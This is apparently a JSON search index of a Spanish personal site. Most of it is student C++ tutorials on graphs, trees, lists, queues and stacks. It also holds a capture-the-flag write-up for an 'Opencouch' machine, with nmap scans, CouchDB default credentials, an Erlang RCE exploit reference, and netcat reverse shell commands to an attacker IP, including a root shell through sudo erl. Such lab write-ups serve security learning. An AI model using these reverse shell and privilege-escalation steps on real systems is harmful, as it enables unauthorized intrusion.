[{"content":"En esta pagina se encuentran listados los programas de la Actividad 2 de Abstraccion y uso de datos.\n","date":"26 May 2023","permalink":"/datos/","section":"Abstraccion y uso de datos","summary":"En esta pagina se encuentran listados los programas de la Actividad 2 de Abstraccion y uso de datos.","title":"Abstraccion y uso de datos"},{"content":"","date":"26 May 2023","permalink":"/","section":"Tris","summary":"","title":"Tris"},{"content":"\r¿Qué son los Grafos? # Un gráfico es una estructura de datos no lineal que consta de vértices y aristas. Los vértices a veces también se denominan nodos y los bordes son líneas o arcos que conectan dos nodos en el gráfico. Más formalmente, un gráfico se compone de un conjunto de vértices (V) y un conjunto de aristas (E). El gráfico se denota por G(E, V).\nExisten diferentes tipos de grafos, incluyendo:\nGrafo no dirigido: Un grafo en el que las aristas no tienen direcciones. La relación entre dos nodos es simétrica.\nGrafo dirigido: Un grafo en el que las aristas tienen direcciones. La relación entre dos nodos puede ser unidireccional.\nGrafo ponderado: Un grafo en el que las aristas tienen un peso o valor asociado. Estos pesos pueden representar distancias, costos, tiempos, etc.\nGrafo con peso mínimo: Un grafo ponderado en el que se busca encontrar la ruta con el peso total más bajo posible.\nGrafo cíclico: Un grafo en el que se puede llegar a un nodo partiendo de sí mismo a través de una secuencia de aristas.\nGrafo acíclico: Un grafo en el que no hay ciclos, es decir, no se puede llegar a un nodo partiendo de sí mismo.\nArboles:Un grafo conexo sin ciclos. Ejemplo: Un árbol genealógico donde cada persona está conectada con sus padres.\nPrograma # #include \u0026lt;iostream\u0026gt; #include \u0026lt;list\u0026gt; using namespace std; class Grafo { private: int numVertices; list\u0026lt;int\u0026gt;* listaAdy; public: Grafo(int n) { numVertices = n; listaAdy = new list\u0026lt;int\u0026gt;[numVertices]; } void agregarArista(int origen, int destino) { if (origen \u0026gt;= 0 \u0026amp;\u0026amp; origen \u0026lt; numVertices \u0026amp;\u0026amp; destino \u0026gt;= 0 \u0026amp;\u0026amp; destino \u0026lt; numVertices) { listaAdy[origen].push_back(destino); listaAdy[destino].push_back(origen); // Si el grafo es no dirigido } } void mostrarGrafo() { for (int i = 0; i \u0026lt; numVertices; i++) { cout \u0026lt;\u0026lt; \u0026#34;Vertice \u0026#34; \u0026lt;\u0026lt; i \u0026lt;\u0026lt; \u0026#34;: \u0026#34;; for (list\u0026lt;int\u0026gt;::iterator it = listaAdy[i].begin(); it != listaAdy[i].end(); ++it) { cout \u0026lt;\u0026lt; *it \u0026lt;\u0026lt; \u0026#34; \u0026#34;; } cout \u0026lt;\u0026lt; endl; } } }; int main() { Grafo grafo(5); grafo.agregarArista(0, 1); grafo.agregarArista(0, 4); grafo.agregarArista(1, 2); grafo.agregarArista(1, 3); grafo.agregarArista(1, 4); grafo.agregarArista(2, 3); grafo.agregarArista(3, 4); grafo.mostrarGrafo(); return 0; } ¿Cómo funciona? # Se utilizan las bibliotecas necesarias: \u0026lt;iostream\u0026gt; para la entrada/salida estándar y \u0026lt;list\u0026gt; para la lista enlazada.\n#include \u0026lt;iostream\u0026gt; #include \u0026lt;list\u0026gt; using namespace std; Se define la clase Grafo con los miembros privados numVertices y listaAdy. numVertices almacena el número de vértices del grafo, y listaAdy es un puntero a una matriz de listas enlazadas que representa las adyacencias entre los vértices.\nclass Grafo { private: int numVertices; list\u0026lt;int\u0026gt;* listaAdy; El constructor de la clase Grafo recibe un entero n que indica el número de vértices del grafo. El constructor inicializa numVertices con el valor n y crea una nueva matriz de listas enlazadas listaAdy de tamaño numVertices.\npublic: Grafo(int n) { numVertices = n; listaAdy = new list\u0026lt;int\u0026gt;[numVertices]; } El método agregarArista recibe dos enteros origen y destino, que representan los vértices de una arista. Primero, se verifica si los vértices están dentro del rango válido y luego se agrega la arista en ambas direcciones (ya que el grafo es no dirigido) conectando los vértices en las listas de adyacencia correspondientes.\nvoid agregarArista(int origen, int destino) { if (origen \u0026gt;= 0 \u0026amp;\u0026amp; origen \u0026lt; numVertices \u0026amp;\u0026amp; destino \u0026gt;= 0 \u0026amp;\u0026amp; destino \u0026lt; numVertices) { listaAdy[origen].push_back(destino); listaAdy[destino].push_back(origen); // Si el grafo es no dirigido } } El método mostrarGrafo itera sobre cada vértice del grafo y muestra sus adyacencias. Utiliza un bucle for para iterar sobre los vértices del grafo, y dentro de ese bucle, utiliza otro bucle for para iterar sobre la lista de adyacencia del vértice actual. Cada elemento de la lista de adyacencia se imprime en la salida estándar.\nvoid mostrarGrafo() { for (int i = 0; i \u0026lt; numVertices; i++) { cout \u0026lt;\u0026lt; \u0026#34;Vertice \u0026#34; \u0026lt;\u0026lt; i \u0026lt;\u0026lt; \u0026#34;: \u0026#34;; for (list\u0026lt;int\u0026gt;::iterator it = listaAdy[i].begin(); it != listaAdy[i].end(); ++it) { cout \u0026lt;\u0026lt; *it \u0026lt;\u0026lt; \u0026#34; \u0026#34;; } cout \u0026lt;\u0026lt; endl; } } En la función main, se crea un objeto grafo de la clase Grafo con 5 vértices.\nint main() { Grafo grafo(5); Se agregan varias aristas al grafo utilizando el método agregarArista. Estas aristas construyen una estructura de grafo con conexiones entre los vértices.\ngrafo.agregarArista(0, 1); grafo.agregarArista(0, 4); grafo.agregarArista(1, 2); grafo.agregarArista(1, 3); grafo.agregarArista(1, 4); grafo.agregarArista(2, 3); grafo.agregarArista(3, 4); Finalmente, se llama al método mostrarGrafo para mostrar la representación del grafo en la salida estándar y con return 0 indica que el programa se ejecuto correctamente.\ngrafo.mostrarGrafo(); return 0; } Video # ","date":"26 May 2023","permalink":"/datos/grafos/","section":"Abstraccion y uso de datos","summary":"¿Qué son los Grafos?","title":"Grafos"},{"content":"\r¿Qué son los Arboles? # Un árbol es una estructura de datos no lineal que se compone de nodos interconectados. Es similar a un árbol real, donde tienes un nodo raíz y cada nodo puede tener cero o más nodos hijos. Los nodos se conectan mediante enlaces o aristas.\nEn un árbol, el nodo superior se denomina nodo raíz, y los nodos directamente conectados a él se denominan nodos hijos. A su vez, esos nodos pueden tener sus propios nodos hijos, formando así una estructura jerárquica. Los nodos que no tienen hijos se llaman nodos hoja o nodos terminales.\nPrograma # #include \u0026lt;iostream\u0026gt; using namespace std; class node{ public: int data; node* left; node* right; }; node* newNode(int data){ node* Node = new node(); Node-\u0026gt;data = data; Node-\u0026gt;left = NULL; Node-\u0026gt;right = NULL; return(Node); } int size(node* node){ if (node == NULL) return 0; else return(size(node-\u0026gt;left)+ 1 + size(node-\u0026gt;right)); } int main(){ node *root = newNode(1); root-\u0026gt;left = newNode(2); root-\u0026gt;right = newNode(3); root-\u0026gt;left-\u0026gt;left = newNode(4); root-\u0026gt;right-\u0026gt;right = newNode(5); cout\u0026lt;\u0026lt; \u0026#34;El tamaño del árbol es: \u0026#34;\u0026lt;\u0026lt; size(root); return 0; } ¿Cómo funciona? # Biblioteca necesarias para cout.\n#include \u0026lt;iostream\u0026gt; using namespace std; Se crea la clase nodeque representa un nodo del árbol binario, La clase node tiene tres atributos: data para almacenar el valor del nodo y left y right para apuntar a los nodos hijos izquierdo y derecho, respectivamente.\nclass node { public: int data; node* left; node* right; }; Se define la función newNode que crea un nuevo nodo del árbol binario y devuelve su puntero:\nnode* newNode(int data) { node* Node = new node(); Node-\u0026gt;data = data; Node-\u0026gt;left = NULL; Node-\u0026gt;right = NULL; return Node; } La función newNode recibe un valor de datos como argumento, crea un nuevo nodo utilizando new, establece el valor del nodo con el dato proporcionado y establece los punteros left y right en NULL. Luego, devuelve el puntero al nuevo nodo creado. En la funcion principal main se crea un arbol binario,luego, se llama a la función size pasando el puntero al nodo raíz del árbol y se muestra el resultado con cout.\nVideo # ","date":"26 May 2023","permalink":"/datos/arbol/","section":"Abstraccion y uso de datos","summary":"¿Qué son los Arboles?","title":"Arboles"},{"content":"\r¿Qué son las listas? # Las listas en C++ son una estructura de datos enlazada que permite almacenar y manipular una colección de elementos de manera dinámica. A diferencia de los arreglos, las listas no tienen un tamaño fijo y pueden crecer o reducirse según sea necesario.\nPrograma # #include \u0026lt;iostream\u0026gt; #include \u0026lt;list\u0026gt; // Libreria lista using namespace std; int main() { list\u0026lt;int\u0026gt; listaProve; // creamos la lista y se asigna nombre int opt; int el; cout \u0026lt;\u0026lt; \u0026#34;#Prueba de listas#\\n\u0026#34;; while (true) { cout \u0026lt;\u0026lt; \u0026#34;1: Insertar elemento al frente\\n2: Insertar elemento atrás\\n3: Ver los elementos de la lista\\n4: Eliminar lista\\n5: Verificar lista vacia\\n6: Salir\\n:\u0026#34;; cin \u0026gt;\u0026gt; opt; switch (opt) { case 1: cout \u0026lt;\u0026lt; \u0026#34;Dame el elemento a insertar: \u0026#34;; cin \u0026gt;\u0026gt; el; listaProve.push_front(el); break; case 2: cout \u0026lt;\u0026lt; \u0026#34;Dame el elemento a insertar atrás: \u0026#34;; cin \u0026gt;\u0026gt; el; listaProve.push_back(el); break; case 3: cout \u0026lt;\u0026lt; \u0026#34;Los elementos de la lista son: \u0026#34;; for (const int\u0026amp; elemento : listaProve) { cout \u0026lt;\u0026lt; elemento \u0026lt;\u0026lt; \u0026#34; \u0026#34;; } cout \u0026lt;\u0026lt; endl; break; case 4: listaProve.clear(); cout \u0026lt;\u0026lt; \u0026#34;Lista eliminada.\u0026#34; \u0026lt;\u0026lt; endl; break; case 5: if (listaProve.empty()) { cout \u0026lt;\u0026lt; \u0026#34;La lista está vacía.\u0026#34; \u0026lt;\u0026lt; endl; } else { cout \u0026lt;\u0026lt; \u0026#34;La lista no está vacía.\u0026#34; \u0026lt;\u0026lt; endl; } break; case 6: return 0; default: cout \u0026lt;\u0026lt; \u0026#34;Opción inválida. Por favor, intenta nuevamente.\u0026#34; \u0026lt;\u0026lt; endl; break; } } return 0; } ¿Cómo funciona? # En este caso, incluimos las bibliotecas \u0026lt;iostream\u0026gt; para entrada y salida estándar, y \u0026lt;list\u0026gt; para utilizar la clase list que nos permite trabajar con listas en C++.\n#include \u0026lt;iostream\u0026gt; #include \u0026lt;list\u0026gt; // Librería lista using namespace std; Creamos una lista llamada listaProve que almacenará elementos enteros. Además, declaramos dos variables opt y el que se utilizarán para almacenar opciones del usuario y elementos de la lista, respectivamente.\nlist\u0026lt;int\u0026gt; listaProve; // creamos la lista y se asigna nombre int opt; int el; cout \u0026lt;\u0026lt; \u0026#34;#Prueba de listas#\\n\u0026#34;; Iniciamos un bucle while, el programa se ejecutará en un bucle infinito hasta que se encuentre una instrucción return o se produzca una interrupción.\nwhile (true) { } Se muestra un menú con varias opciones y se solicita al usuario que ingrese una opción. El valor ingresado se guarda en la variable opt.\ncout \u0026lt;\u0026lt; \u0026#34;1: Insertar elemento al frente\\n2: Insertar elemento atrás\\n3: Ver los elementos de la lista\\n4: Eliminar lista\\n5: Verificar lista vacia\\n6: Salir\\n:\u0026#34;; cin \u0026gt;\u0026gt; opt; Dependiendo de la opción ingresada por el usuario, se ejecutará el código correspondiente al caso seleccionado. Si la opción es 6, se termina el programa con return 0. Si la opción no coincide con ningún caso, se ejecutará el código del caso default (opción inválida).\nswitch (opt) { case 1: cout \u0026lt;\u0026lt; \u0026#34;Dame el elemento a insertar: \u0026#34;; cin \u0026gt;\u0026gt; el; listaProve.push_front(el); break; case 2: cout \u0026lt;\u0026lt; \u0026#34;Dame el elemento a insertar atrás: \u0026#34;; cin \u0026gt;\u0026gt; el; listaProve.push_back(el); break; case 3: cout \u0026lt;\u0026lt; \u0026#34;Los elementos de la lista son: \u0026#34;; for (const int\u0026amp; elemento : listaProve) { cout \u0026lt;\u0026lt; elemento \u0026lt;\u0026lt; \u0026#34; \u0026#34;; } cout \u0026lt;\u0026lt; endl; break; case 4: listaProve.clear(); cout \u0026lt;\u0026lt; \u0026#34;Lista eliminada.\u0026#34; \u0026lt;\u0026lt; endl; break; case 5: if (listaProve.empty()) { cout \u0026lt;\u0026lt; \u0026#34;La lista está vacía.\u0026#34; \u0026lt;\u0026lt; endl; } else { cout \u0026lt;\u0026lt; \u0026#34;La lista no está vacía.\u0026#34; \u0026lt;\u0026lt; endl; } break; case 6: return 0; default: cout \u0026lt;\u0026lt; \u0026#34;Opción inválida. Por favor, intenta nuevamente.\u0026#34; \u0026lt;\u0026lt; endl; break; } Las opciones del menu: Opción 1: Insertar elemento al frente de la lista. listaProve.push_front(el); Opción 2: Insertar elemento al final de la lista. listaProve.push_back(el); Opción 3: Mostrar los elementos de la lista utilizando un bucle for:\ncout \u0026lt;\u0026lt; \u0026#34;Los elementos de la lista son: \u0026#34;; for (const int\u0026amp; elemento : listaProve) { cout \u0026lt;\u0026lt; elemento \u0026lt;\u0026lt; \u0026#34; \u0026#34;; } cout \u0026lt;\u0026lt; endl; Se recorre la lista utilizando un bucle for y se muestra cada elemento en la salida estándar. Opción 4: Eliminar todos los elementos de la lista: listaProve.clear(); Opción 5: Verificar si la lista está vacía:\nif (listaProve.empty()) { cout \u0026lt;\u0026lt; \u0026#34;La lista está vacía.\u0026#34; \u0026lt;\u0026lt; endl; } else { cout \u0026lt;\u0026lt; \u0026#34;La lista no está vacía.\u0026#34; \u0026lt;\u0026lt; endl; } En la opcion 6 se ternima el programa con return 0\nVideo # ","date":"26 May 2023","permalink":"/datos/listas/","section":"Abstraccion y uso de datos","summary":"¿Qué son las listas?","title":"Listas"},{"content":"\r¿Qué son las colas? # Las colas en C++ son una estructura de datos que siguen el principio de \u0026ldquo;FIFO\u0026rdquo; (First In, First Out), lo que significa que el primer elemento que se inserta en la cola es el primero en ser eliminado.\nSe utilizan metodos como el push y pop tambien para agregar o eliminar un valor de la cola.\nPrograma # #include \u0026lt;iostream\u0026gt; #include \u0026lt;queue\u0026gt; // Utilizamos la libreria queue para las colas en c++ using namespace std; int main(int argc, char** argv) { // Declaramos el nombre de la cola queue\u0026lt;int\u0026gt; numeros; int num; int opt; cout \u0026lt;\u0026lt; \u0026#34;#Este es un ejemplo de Colas#\\n\u0026#34;; while(true){ cout \u0026lt;\u0026lt; \u0026#34;1: Insertar elemento a la cola\\n2: Eliminar elemento de la cola\\n3: Ver tamaño y el primer elemento de la cola\\n4: Salir\\n:\u0026#34;; cin \u0026gt;\u0026gt; opt; switch (opt){ case 1: cout \u0026lt;\u0026lt; \u0026#34;Dame el numero a insertar: \u0026#34;; cin \u0026gt;\u0026gt; num; numeros.push(num); cout \u0026lt;\u0026lt; \u0026#34;El numero fue agregado a la cola.\\n\u0026#34;; break; case 2: numeros.pop(); cout \u0026lt;\u0026lt; \u0026#34;El primer elemento de la cola fue eliminado.\\n\u0026#34;; break; case 3: cout \u0026lt;\u0026lt; \u0026#34;El tamaño de la cola es: \u0026#34;\u0026lt;\u0026lt; numeros.size() \u0026lt;\u0026lt; \u0026#34;\\nEl numero de enfrente es: \u0026#34; \u0026lt;\u0026lt; numeros.front() \u0026lt;\u0026lt; \u0026#34;\\n\u0026#34;; break; case 4: return 0; } } return 0; } ¿Cómo funciona? # Primero declaramos las librerias que utilizaremos, en este caso utilizaremos la libreria \u0026lt;queue\u0026gt; que tiene los metodos necesarios para las colas.\n#include \u0026lt;iostream\u0026gt; #include \u0026lt;queue\u0026gt; // Utilizamos la libreria queue para las colas en c++ using namespace std; // para no tener que escribir std:: en cout, cin, etc. En la funcion principal main declaramos en un inicio las variables que utilizaremos, opt para las opciones del switch, num para el numero que y tambien el nombre de la cola, en este caso le puse numeros.\nint main(int argc, char** argv) { // Declaramos el nombre de la cola queue\u0026lt;int\u0026gt; numeros; int num; int opt; Continuamos con un mensaje de lo que sera el programa y pasamos al while que funciona para que el codigo que este dentro se siga ejecutando una vez se realizo en este caso la opcion de switch.\ncout \u0026lt;\u0026lt; \u0026#34;#Este es un ejemplo de Colas#\\n\u0026#34;; while(true){ cout \u0026lt;\u0026lt; \u0026#34;1: Insertar elemento a la cola\\n2: Eliminar elemento de la cola\\n3: Ver tamaño y el primer elemento de la cola\\n4: Salir\\n:\u0026#34;; cin \u0026gt;\u0026gt; opt; switch (opt){ case 1: cout \u0026lt;\u0026lt; \u0026#34;Dame el numero a insertar: \u0026#34;; cin \u0026gt;\u0026gt; num; numeros.push(num); cout \u0026lt;\u0026lt; \u0026#34;El numero fue agregado a la cola.\\n\u0026#34;; break; case 2: numeros.pop(); cout \u0026lt;\u0026lt; \u0026#34;El primer elemento de la cola fue eliminado.\\n\u0026#34;; break; case 3: cout \u0026lt;\u0026lt; \u0026#34;El tamaño de la cola es: \u0026#34;\u0026lt;\u0026lt; numeros.size() \u0026lt;\u0026lt; \u0026#34;\\nEl numero de enfrente es: \u0026#34; \u0026lt;\u0026lt; numeros.front() \u0026lt;\u0026lt; \u0026#34;\\n\u0026#34;; break; case 4: return 0; } } Video # ","date":"26 May 2023","permalink":"/datos/colas/","section":"Abstraccion y uso de datos","summary":"¿Qué son las colas?","title":"Colas"},{"content":"\r¿Qué son las pilas? # Las pilas permiten almacenar y recuperar datos, es una estructura de tipo last-in-first-out(LIFO), lo que quiere decir que el ultimo en entrar es el primero en salir.\nTiene dos operaciones las cuales son Push y Pop, en donde push permite agregar un objeto a la pila y pop permite sacar este ultimo elemento.\nPrograma # #include \u0026lt;iostream\u0026gt; #include \u0026lt;stdexcept\u0026gt; using namespace std; class Pila { private: static const int MAX = 3; int tope; int valores[MAX]; public: Pila() { tope = -1; } bool empty() const { return tope == -1; } bool full() const { return tope == MAX - 1; } void push(int v) { if (full()) { cout \u0026lt;\u0026lt;\u0026#34;No se puede agregar un elemento: la pila esta llena\u0026#34;; } valores[++tope] = v; } int pop() { if (empty()) { cout \u0026lt;\u0026lt; \u0026#34;No es posible extraer un elemento: la pila esta vacia\u0026#34;; } return valores[tope--]; } int top() const { if (empty()) { cout \u0026lt;\u0026lt; \u0026#34;La pila esta vacia\u0026#34;; } return valores[tope]; } }; int main() { Pila pila1; int num; int a; cout \u0026lt;\u0026lt; \u0026#34;#Este sera un ejemplo para pilas#\\n\u0026#34;; while (true) { cout \u0026lt;\u0026lt; \u0026#34;1: Apilar numero\\n2: Desapilar numero\\n3: Salir\\n:\u0026#34;; cin \u0026gt;\u0026gt; num; switch (num) { case 1: cout \u0026lt;\u0026lt; \u0026#34;Ingresa el numero: \u0026#34;; cin \u0026gt;\u0026gt; a; try { pila1.push(a); } catch (const runtime_error\u0026amp; e) { cout \u0026lt;\u0026lt; \u0026#34;Error: \u0026#34; \u0026lt;\u0026lt; e.what() \u0026lt;\u0026lt; endl; } break; case 2: try { cout \u0026lt;\u0026lt; \u0026#34;Este es el ultimo del arreglo: \u0026#34; \u0026lt;\u0026lt; pila1.top() \u0026lt;\u0026lt; endl; pila1.pop(); cout \u0026lt;\u0026lt; \u0026#34;Numero desapilado\\n\u0026#34; \u0026lt;\u0026lt;\u0026#34;El siguiente en la pila es: \u0026#34;\u0026lt;\u0026lt; pila1.top() \u0026lt;\u0026lt; endl; } catch (const runtime_error\u0026amp; e) { cout \u0026lt;\u0026lt; \u0026#34;Error: \u0026#34; \u0026lt;\u0026lt; e.what() \u0026lt;\u0026lt; endl; } break; case 3: return 0; default: cout \u0026lt;\u0026lt; \u0026#34;Opción invalida. Ingresa un numero valido.\u0026#34; \u0026lt;\u0026lt; endl; break; } } return 0; } ¿Cómo funciona? # Utilizamos la libreria stdexcept para las excepciones en el programa por si se ingresa algo no esperado.\n#include \u0026lt;iostream\u0026gt; #include \u0026lt;stdexcept\u0026gt; using namespace std; Hacemos una clase pila en donde estaran los metodos que utilizaremos, como push para apilar un elemento, pop para desapilar un elemento, y otros como full y empty, para saber si el arreglo esta lleno o vacio respectivamente y el metodo top el cual sera para regresar el valor que este hasta enfrente. Se declaran tambien variables como el valor maximo del arreglo para la pila y el tope, estos en privado.\nclass Pila { private: static const int MAX = 3; int tope; int valores[MAX]; public: Pila() { tope = -1; } bool empty() const { return tope == -1; // se comprueba si la pila esta vacia comparando con el valor inicial el cual es -1 } bool full() const { return tope == MAX - 1; // se comprueba si la pila esta llena, restando el valor maximo } void push(int v) { if (full()) { cout \u0026lt;\u0026lt;\u0026#34;No se puede agregar un elemento: la pila esta llena\u0026#34;; } valores[++tope] = v; // Se agrega el valor a valores } int pop() { if (empty()) { cout \u0026lt;\u0026lt; \u0026#34;No es posible extraer un elemento: la pila esta vacia\u0026#34;; } return valores[tope--]; // quita el valor de enfrente de la pila } int top() const { if (empty()) { cout \u0026lt;\u0026lt; \u0026#34;La pila esta vacia\u0026#34;; } return valores[tope]; // regresa lo que esta en el top } }; Se declara la pila como pila1 y tambien las variables para poderlas utilizar en el programa.\nint main() { Pila pila1; int num; int a; Se utiliza una estructura de control while para que el programa siga funcionando y se realicen las acciones mientras el valor sea verdadero.\nDentro del while se encuentra un menu con switch y en el primer caso se realiza la apilacion de un numero, el segundo desapila un numero y el caso tres salimos del programa.\ncout \u0026lt;\u0026lt; \u0026#34;#Este sera un ejemplo para pilas#\\n\u0026#34;; while (true) { cout \u0026lt;\u0026lt; \u0026#34;1: Apilar numero\\n2: Desapilar numero\\n3: Salir\\n:\u0026#34;; cin \u0026gt;\u0026gt; num; switch (num) { case 1: cout \u0026lt;\u0026lt; \u0026#34;Ingresa el numero: \u0026#34;; cin \u0026gt;\u0026gt; a; try { pila1.push(a); } catch (const runtime_error\u0026amp; e) { cout \u0026lt;\u0026lt; \u0026#34;Error: \u0026#34; \u0026lt;\u0026lt; e.what() \u0026lt;\u0026lt; endl; } break; case 2: try { cout \u0026lt;\u0026lt; \u0026#34;Este es el ultimo del arreglo: \u0026#34; \u0026lt;\u0026lt; pila1.top() \u0026lt;\u0026lt; endl; pila1.pop(); cout \u0026lt;\u0026lt; \u0026#34;Numero desapilado\\n\u0026#34; \u0026lt;\u0026lt;\u0026#34;El siguiente en la pila es: \u0026#34;\u0026lt;\u0026lt; pila1.top() \u0026lt;\u0026lt; endl; } catch (const runtime_error\u0026amp; e) { cout \u0026lt;\u0026lt; \u0026#34;Error: \u0026#34; \u0026lt;\u0026lt; e.what() \u0026lt;\u0026lt; endl; } break; case 3: return 0; default: cout \u0026lt;\u0026lt; \u0026#34;Opción invalida. Ingresa un numero valido.\u0026#34; \u0026lt;\u0026lt; endl; break; } } Video # ","date":"26 May 2023","permalink":"/datos/pilas/","section":"Abstraccion y uso de datos","summary":"¿Qué son las pilas?","title":"Pilas"},{"content":"Aqui estare poniendo Writeups de las maquinas que ire resolviendo de las paginas Hackthebox, EchoCTF, Tryhackme, etc.\n","date":"8 February 2023","permalink":"/machines/","section":"Machines","summary":"Aqui estare poniendo Writeups de las maquinas que ire resolviendo de las paginas Hackthebox, EchoCTF, Tryhackme, etc.","title":"Machines"},{"content":"IP: 10.0.160.39\nPort: 80,4369,5984,9100\nAnalisis Nmap # # Nmap 7.93 scan initiated Wed Feb 1 21:54:46 2023 as: nmap -sS --min-rate 5000 -vvv -open -p- -n -Pn -oG allPorts 10.0.160.39 # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;) Host: 10.0.160.39 () Status: Up Host: 10.0.160.39 () Ports: 80/open/tcp//http///, 4369/open/tcp//epmd///, 5984/open/tcp//couchdb///, 9100/open/tcp//jetdirect/// # Nmap done at Wed Feb 1 21:55:25 2023 -- 1 IP address (1 host up) scanned in 39.87 seconds Analisis de puertos especificos # # Nmap 7.93 scan initiated Wed Feb 1 20:20:35 2023 as: nmap -sCV -Pn -p80,4369,5984,9100 -oN targeted 10.0.160.39 Nmap scan report for 10.0.160.39 Host is up (0.15s latency). PORT STATE SERVICE VERSION 80/tcp open http nginx 1.18.0 |_http-title: OpenNote |_http-server-header: nginx/1.18.0 4369/tcp open epmd Erlang Port Mapper Daemon | epmd-info: | epmd_port: 4369 | nodes: |_ couchdb: 9100 5984/tcp open http CouchDB httpd 3.2.1 (Erlang OTP/20) |_http-server-header: CouchDB/3.2.1 (Erlang OTP/20) |_http-title: Site doesn\u0026#39;t have a title (application/json). 9100/tcp open jetdirect? Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Feb 1 20:20:52 2023 -- 1 IP address (1 host up) scanned in 17.41 seconds Explotación # Encontramos una bandera en http://admin:password@10.0.160.39:5984/_all_dbs Esto se puede hacer dentro de la maquina con:\ncurl http://admin:password@localhost:5984/_all_dbs Explotacion Podemos utilizar el siguiente exploit para obtener la reverse shell https://www.exploit-db.com/exploits/50914\n-$ python 50914.py Remote Command Execution via Erlang Distribution Protocol. Found name couchdb at port 9100 Authentication successful Enter command: \u0026gt; nc -c bash 10.10.0.54 1234 Dentro de la maquina utilizamos nos dan Sudoers de erl y podemos utilizarlo para escalar de privilegios https://book.hacktricks.xyz/network-services-pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd\ncouchdb@opencouch:/$ sudo /usr/bin/erl h Y nos enviamos una reverse shell con root\ncouchdb@opencouch:/$ sudo /usr/bin/erl h Erlang/OTP 23 [erts-11.1.8] [source] [64-bit] [smp:2:2] [ds:2:2:10] [async-threads:1] Eshell V11.1.8 (abort with ^G) 1\u0026gt; os:cmd(\u0026#39;nc -c 10.10.0.54 443\u0026#39;). Pwned ","date":"8 February 2023","permalink":"/machines/opencouch/","section":"Machines","summary":"IP: 10.","title":"Opencouch"},{"content":"","date":"8 February 2023","permalink":"/posts/","section":"Posts","summary":"","title":"Posts"},{"content":"","date":"8 February 2023","permalink":"/posts/someinfo/","section":"Posts","summary":"","title":"Someinfo"},{"content":"\rPresentación # Hola, esta pagina sera para subir mis proyectos, lo que vaya aprendiendo y alguna que otra cosa extra.\n","date":"8 February 2023","permalink":"/posts/intro/","section":"Posts","summary":"Presentación # Hola, esta pagina sera para subir mis proyectos, lo que vaya aprendiendo y alguna que otra cosa extra.","title":"Intro"},{"content":"","date":"1 January 0001","permalink":"/authors/","section":"Authors","summary":"","title":"Authors"},{"content":"","date":"1 January 0001","permalink":"/categories/","section":"Categories","summary":"","title":"Categories"},{"content":"","date":"1 January 0001","permalink":"/series/","section":"Series","summary":"","title":"Series"},{"content":"","date":"1 January 0001","permalink":"/tags/","section":"Tags","summary":"","title":"Tags"}]